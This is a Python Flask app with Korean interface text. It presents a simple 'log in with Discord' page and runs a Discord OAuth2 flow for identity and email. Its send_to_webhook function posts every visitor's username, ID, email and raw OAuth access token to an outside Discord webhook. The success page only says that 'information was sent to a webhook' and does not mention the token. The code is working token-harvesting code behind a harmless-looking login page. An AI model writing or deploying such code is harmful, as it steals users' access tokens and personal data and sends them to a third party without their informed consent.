import os
import discordoauth2
import requests
import time
import traceback
from flask import Flask, request, redirect

# ============================================================
# Render 환경변수
# ============================================================
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
# ============================================================

app = Flask(__name__)
client = discordoauth2.Client(CLIENT_ID, secret=CLIENT_SECRET, redirect=REDIRECT_URI)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Discord OAuth2 로그인</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: #0d1117;
                color: #c9d1d9;
            }
            .container {
                text-align: center;
                background: #161b22;
                padding: 50px;
                border-radius: 16px;
                border: 1px solid #30363d;
                box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            }
            h1 {
                color: #58a6ff;
                margin-bottom: 10px;
            }
            p {
                color: #8b949e;
                margin-bottom: 30px;
            }
            .btn {
                background: #5865f2;
                color: white;
                padding: 14px 40px;
                border: none;
                border-radius: 8px;
                font-size: 18px;
                font-weight: bold;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
                transition: background 0.2s;
            }
            .btn:hover {
                background: #4752c4;
            }
            .footer {
                margin-top: 20px;
                font-size: 12px;
                color: #484f58;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔑 Discord OAuth2</h1>
            <p>디스코드 계정으로 간편하게 로그인하세요</p>
            <a href="/login" class="btn">🚀 디스코드로 로그인</a>
            <div class="footer">개발자: gg</div>
        </div>
    </body>
    </html>
    '''

@app.route('/login')
def login():
    return redirect(client.generate_uri(scope=["identify", "email"]))

@app.route('/oauth2')
def oauth2_callback():
    code = request.args.get('code')
    if not code:
        return "❌ 인증 코드가 없습니다.", 400
    
    try:
        # Rate Limit 대비 (2초 대기)
        time.sleep(2)
        
        access = client.exchange_code(code)
        user_info = access.fetch_identify()
        
        send_to_webhook(access, user_info)
        
        return success_page(user_info)
        
    except Exception as e:
        error_msg = str(e)
        print(f"❌ 오류: {error_msg}")
        print(traceback.format_exc())
        
        # Rate Limit이면 재시도
        if "Rate Limited" in error_msg or "retry_after" in error_msg:
            time.sleep(5)
            try:
                access = client.exchange_code(code)
                user_info = access.fetch_identify()
                send_to_webhook(access, user_info)
                return success_page(user_info)
            except Exception as retry_error:
                return f"❌ 재시도 실패: {retry_error}", 500
        
        if WEBHOOK_URL:
            requests.post(WEBHOOK_URL, json={
                "content": f"❌ **로그인 실패!**\n```\n{error_msg[:500]}\n```"
            })
        
        return f"❌ 오류: {error_msg}", 500

def send_to_webhook(access, user_info):
    if not WEBHOOK_URL:
        return
    
    webhook_data = {
        "content": f"🔑 **{user_info.get('username')}** 님이 로그인했습니다!",
        "embeds": [{
            "title": "👤 사용자 정보",
            "color": 0x5865F2,
            "fields": [
                {"name": "📛 사용자명", "value": user_info.get('username', 'N/A'), "inline": True},
                {"name": "🆔 ID", "value": f"`{user_info.get('id', 'N/A')}`", "inline": True},
                {"name": "📧 이메일", "value": user_info.get('email', '비공개'), "inline": True},
                {"name": "🔑 Access Token", "value": f"```{access.token}```", "inline": False}
            ],
            "footer": {"text": f"로그인 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}"}
        }]
    }
    requests.post(WEBHOOK_URL, json=webhook_data)

def success_page(user_info):
    username = user_info.get('username', 'Unknown')
    email = user_info.get('email', 'N/A')
    user_id = user_info.get('id', 'N/A')
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>로그인 성공!</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: #0d1117;
                color: #c9d1d9;
            }}
            .container {{
                text-align: center;
                background: #161b22;
                padding: 50px;
                border-radius: 16px;
                border: 1px solid #30363d;
                max-width: 500px;
                box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            }}
            h1 {{ color: #3fb950; margin-bottom: 10px; }}
            .info {{
                text-align: left;
                background: #0d1117;
                padding: 20px;
                border-radius: 8px;
                margin: 20px 0;
                border: 1px solid #30363d;
            }}
            .info p {{ margin: 8px 0; }}
            .label {{ color: #8b949e; font-size: 12px; }}
            .value {{ color: #c9d1d9; font-weight: bold; }}
            .btn {{
                background: #238636;
                color: white;
                padding: 12px 30px;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
            }}
            .btn:hover {{ background: #2ea043; }}
            .footer {{ margin-top: 20px; font-size: 12px; color: #484f58; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✅ 로그인 성공!</h1>
            <p>웹훅으로 정보가 전송되었습니다.</p>
            <div class="info">
                <p><span class="label">사용자명</span><br><span class="value">{username}</span></p>
                <p><span class="label">이메일</span><br><span class="value">{email}</span></p>
                <p><span class="label">사용자 ID</span><br><span class="value">{user_id}</span></p>
            </div>
            <a href="/" class="btn">🏠 홈으로</a>
            <div class="footer">gg • Discord OAuth2</div>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
